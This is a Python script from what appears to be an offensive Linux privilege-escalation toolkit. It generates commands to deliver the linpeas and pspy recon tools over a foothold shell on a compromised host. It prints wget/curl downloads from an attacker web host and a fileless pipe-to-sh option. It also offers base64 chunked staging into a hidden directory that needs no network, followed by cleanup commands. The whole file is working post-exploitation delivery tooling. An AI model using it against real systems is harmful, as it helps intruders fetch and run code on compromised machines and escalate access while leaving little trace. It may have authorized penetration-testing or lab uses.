#!/usr/bin/env python3
"""BUCKET 2-adjacent -- stage + run a recon helper (linpeas / pspy) over a foothold shell.
Same delivery as gen_exploit.py, but these FIND the privesc vector rather than exploit it.
Edit LHOST / LPORT / WEBHOST in _linpriv_common.py.

Usage:
  python3 gen_recon.py list
  python3 gen_recon.py linpeas --fetch            # fileless pipe-to-sh (nothing on disk)
  python3 gen_recon.py pspy    --fetch            # binary -> lands on disk, chmod, run
  python3 gen_recon.py <tool>  --b64 /path/to/tool   # no-network: base64 through the channel

Prep for --fetch: serve the tool on the attacker (python3 -m http.server 80).
"""
import sys, os, base64
import _linpriv_common as P

def die(m): print(m); sys.exit(1)

if len(sys.argv) < 2 or sys.argv[1] == "list":
    print("recon tool   kind     what it finds")
    print("-" * 60)
    for k, r in P.RECON.items():
        print(f"{k:<12} {r['kind']:<8} {r['note']}")
    sys.exit(0)

name = sys.argv[1]
if name not in P.RECON: die(f"unknown recon tool '{name}'. Run: python3 gen_recon.py list")
R = P.RECON[name]
method = "--fetch" if "--fetch" in sys.argv else ("--b64" if "--b64" in sys.argv else None)
if not method: die("choose a delivery method: --fetch  or  --b64 <path>")

DIR = (sys.argv[sys.argv.index("--stagedir")+1] if "--stagedir" in sys.argv else P.STAGE).rstrip("/") + "/.r"
DST = f"{DIR}/{R['file']}"
print(f"# recon={name} ({R['kind']})  |  {R['note']}\n")

if method == "--fetch":
    if R["kind"] == "script" and R.get("fetch_run"):
        print(f"# fileless — pipe straight to sh, nothing touches disk:")
        print(R["fetch_run"].format(URL=P.WEBHOST))
        print(f"\n# on-disk alternative (if you want to re-run / pass flags):")
        print(f"mkdir -p {DIR}; wget -q {P.WEBHOST}/{R['file']} -O {DST} || curl -s {P.WEBHOST}/{R['file']} -o {DST}")
        print(R["disk_run"].format(DST=DST))
    else:  # binary
        print(f"mkdir -p {DIR}")
        print(f"wget -q {P.WEBHOST}/{R['file']} -O {DST} || curl -s {P.WEBHOST}/{R['file']} -o {DST}")
        print(R["disk_run"].format(DST=DST))
else:  # --b64  (no network)
    src = sys.argv[sys.argv.index("--b64") + 1]
    if not os.path.exists(src): die(f"file not found: {src}")
    b64 = base64.b64encode(open(src, "rb").read()).decode()
    CH = 50000
    print(f"# stage {src} ({len(b64)} b64 chars) -> {DST} with NO network")
    print(f"mkdir -p {DIR}")
    for i in range(0, len(b64), CH):
        op = ">" if i == 0 else ">>"
        print(f"echo {b64[i:i+CH]}{op}{DST}.b64")
    print(f"base64 -d {DST}.b64 > {DST} && rm {DST}.b64")
    print(R["disk_run"].format(DST=DST))

print(f"\n# cleanup:  rm -rf {DIR}")
